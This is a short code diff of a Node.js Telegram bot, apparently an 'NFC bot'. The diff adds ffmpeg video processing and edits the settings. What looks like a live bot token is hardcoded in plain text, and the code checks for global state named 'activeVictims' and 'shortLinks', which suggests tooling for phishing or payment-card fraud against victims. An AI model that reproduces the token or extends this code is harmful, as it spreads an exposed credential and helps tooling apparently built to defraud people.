@@ -10,13 +10,14 @@ const fs = require('fs');
 const path = require('path');
 const { v4: uuidv4 } = require('uuid');
 
+// --- ПОДКЛЮЧЕНИЕ FFMPEG для обработки видео ---
 const ffmpeg = require('fluent-ffmpeg');
 const ffmpegPath = require('@ffmpeg-installer/ffmpeg').path;
 ffmpeg.setFfmpegPath(ffmpegPath);
 
 // --- НАСТРОЙКИ ---
-const token = '8249796254:AAGV3kYCPf-siSmvl4SOXU4_44HS0y5RUPM'; 
-const ADMIN_ID = 8290877754; 
+const token = '8249796254:AAGV3kYCPf-siSmvl4SOXU4_44HS0y5RUPM'; // Твой токен NFC бота
+const ADMIN_ID = 123456789; // ⚠️ ЗАМЕНИ НА СВОЙ TELEGRAM ID!
 
 // Проверка наявності глобальних змінних
 if (!global.sessions || !global.activeVictims || !global.shortLinks) {
